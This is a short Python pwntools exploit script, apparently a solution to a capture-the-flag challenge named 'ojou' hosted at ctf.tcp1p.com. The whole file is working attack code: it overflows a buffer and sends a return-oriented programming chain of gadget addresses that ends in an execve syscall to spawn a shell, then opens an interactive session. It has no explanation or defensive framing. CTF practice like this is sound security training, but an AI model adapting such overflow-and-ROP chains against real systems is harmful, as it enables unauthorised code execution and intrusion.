#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./ojou", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc ctf.tcp1p.com 6666"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

# pop rdx; ret;
pop_rdx = 0x00479d7a

# pop rax; pop rbp; ret;
pop_rax = 0x00404408

# mov rax, [rax+0x40]; ret;
mov_rax = 0x0040106e

# mov rdi, rax; xor esi, esi; mov r8, rbx; add rsp, 0x28; pop rbp; ret;
mov_rdi = 0x004636b1

syscall = 0x0040316c

payload = b"Ojou! <3" + p8(0) * 314
payload += flat(
    elf.bss(0xc00),
    pop_rdx, 0,
    pop_rax, 0x520690 - 0x40, elf.bss(0xc00),
    mov_rax,
    mov_rdi,
    0, 0, 0, 0, 0,
    elf.bss(0xc00),
    pop_rax, 0x3b, elf.bss(0xc00),
    syscall,
)
io.sendline(payload)

io.interactive()
